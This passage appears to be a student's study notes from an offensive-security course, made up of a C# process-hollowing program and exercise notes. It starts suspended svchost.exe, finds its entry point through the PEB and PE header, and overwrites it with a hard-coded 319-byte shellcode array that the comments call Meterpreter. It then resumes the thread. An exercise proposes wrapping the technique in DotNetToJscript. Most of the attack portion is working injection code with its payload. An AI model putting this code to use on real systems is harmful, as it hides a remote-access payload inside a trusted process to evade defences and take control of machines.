            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,

            MaximumNtStatus = 0xffffffff
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName, 
            string lpCommandLine,
            IntPtr lpProcessAttributes, 
            IntPtr lpThreadAttributes, 
            bool bInheritHandles,
            uint dwCreationFlags, 
            IntPtr lpEnvironment, 
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo, 
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
         private static extern int ZwQueryInformationProcess(IntPtr hProcess,
             int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
             uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
             [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);
        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
             IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            /*
We can now call ZwQueryInformationProcess and fetch the address of the PEB from the
PROCESS_BASIC_INFORMATION structure:
            */

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);

            //Following the DllImport, we can call ReadProcessMemory by specifying an 8-byte buffer that is 
            //then converted to a 64bit integer through the BitConverter.ToInt64278 method and then casted to a
            //pointer using (IntPtr
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            // parsing the PE HEader entrypoint
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            /*
             * To implement this, we convert four bytes at offset 0x3C (e_lfanew field) to an unsigned integer.279
As stated previously, this is the offset from the image base to the PE header structure.
Next, we convert the four bytes at offset e_lfanew plus 0x28 into an unsigned integer. This value 
is the offset from the image base to the EntryPoint
             */
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            /*
             The offset from the base address of svchost.exe to the EntryPoint is also called the relative virtual 
address (RVA). We must add it to the image base to obtain the full memory address of the 
EntryPoint. This is done on the last line of Listing 201.
We have obtained the address of the EntryPoint so we can generate our Meterpreter shellcode 
and use WriteProcessMemory to overwrite the existing code as shown in Listing 202. Remember 
that we must add a DllImport statement for WriteProcessMemory before using it.
             */

            byte[] buf = new byte[319] {
            0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
            0xff,0xff,0x48,0xbb,0xb6,0x91,0x18,0x2b,0x1c,0x05,0x92,0x1b,0x48,0x31,0x58,
            0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x4a,0xd9,0x9b,0xcf,0xec,0xed,
            0x52,0x1b,0xb6,0x91,0x59,0x7a,0x5d,0x55,0xc0,0x4a,0xe0,0xd9,0x29,0xf9,0x79,
            0x4d,0x19,0x49,0xd6,0xd9,0x93,0x79,0x04,0x4d,0x19,0x49,0x96,0xd9,0x93,0x59,
            0x4c,0x4d,0x9d,0xac,0xfc,0xdb,0x55,0x1a,0xd5,0x4d,0xa3,0xdb,0x1a,0xad,0x79,
            0x57,0x1e,0x29,0xb2,0x5a,0x77,0x58,0x15,0x6a,0x1d,0xc4,0x70,0xf6,0xe4,0xd0,
            0x49,0x63,0x97,0x57,0xb2,0x90,0xf4,0xad,0x50,0x2a,0xcc,0x8e,0x12,0x93,0xb6,
            0x91,0x18,0x63,0x99,0xc5,0xe6,0x7c,0xfe,0x90,0xc8,0x7b,0x97,0x4d,0x8a,0x5f,
            0x3d,0xd1,0x38,0x62,0x1d,0xd5,0x71,0x4d,0xfe,0x6e,0xd1,0x6a,0x97,0x31,0x1a,
            0x53,0xb7,0x47,0x55,0x1a,0xd5,0x4d,0xa3,0xdb,0x1a,0xd0,0xd9,0xe2,0x11,0x44,
            0x93,0xda,0x8e,0x71,0x6d,0xda,0x50,0x06,0xde,0x3f,0xbe,0xd4,0x21,0xfa,0x69,
            0xdd,0xca,0x5f,0x3d,0xd1,0x3c,0x62,0x1d,0xd5,0xf4,0x5a,0x3d,0x9d,0x50,0x6f,
            0x97,0x45,0x8e,0x52,0xb7,0x41,0x59,0xa0,0x18,0x8d,0xda,0x1a,0x66,0xd0,0x40,
            0x6a,0x44,0x5b,0xcb,0x41,0xf7,0xc9,0x59,0x72,0x5d,0x5f,0xda,0x98,0x5a,0xb1,
            0x59,0x79,0xe3,0xe5,0xca,0x5a,0xef,0xcb,0x50,0xa0,0x0e,0xec,0xc5,0xe4,0x49,
            0x6e,0x45,0x63,0xa6,0x04,0x92,0x1b,0xb6,0x91,0x18,0x2b,0x1c,0x4d,0x1f,0x96,
            0xb7,0x90,0x18,0x2b,0x5d,0xbf,0xa3,0x90,0xd9,0x16,0xe7,0xfe,0xa7,0xf5,0x27,
            0xb9,0xe0,0xd0,0xa2,0x8d,0x89,0xb8,0x0f,0xe4,0x63,0xd9,0x9b,0xef,0x34,0x39,
            0x94,0x67,0xbc,0x11,0xe3,0xcb,0x69,0x00,0x29,0x5c,0xa5,0xe3,0x77,0x41,0x1c,
            0x5c,0xd3,0x92,0x6c,0x6e,0xcd,0x48,0x7d,0x69,0xf1,0x35,0xd3,0xe9,0x7d,0x2b,
            0x1c,0x05,0x92,0x1b };
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            /*
             * Now that everything is set up correctly, we’ll start the execution of our shellcode. In the previous 
techniques, we have called CreateRemoteThread to spin up a new thread but in this case, a thread 
already exists and is waiting to execute our shellcode.
We can use the Win32 ResumeThread280 API to let the suspended thread of a remote process 
continue its execution. ResumeThread is an easy API to call since it only requires the handle of the 
thread to resume as shown in its function prototype281 in Listing 203

            when CreateProcessW started svchost.exe and populated the PROCESS_INFORMATION 
structure, it also copied the handle of the main thread into it. We can then import ResumeThread
and call it directly
             */

            ResumeThread(pi.hThread);
        }
    }
}

```

It is calling svchost but then exits

### 5.4.2.1 Exercises
1. Replicate the process hollowing technique using shellcode from C#.

`svchost.exe` not working.

2. Modify the code to generate a Jscript file using DotNetToJscript that performs process hollowing.














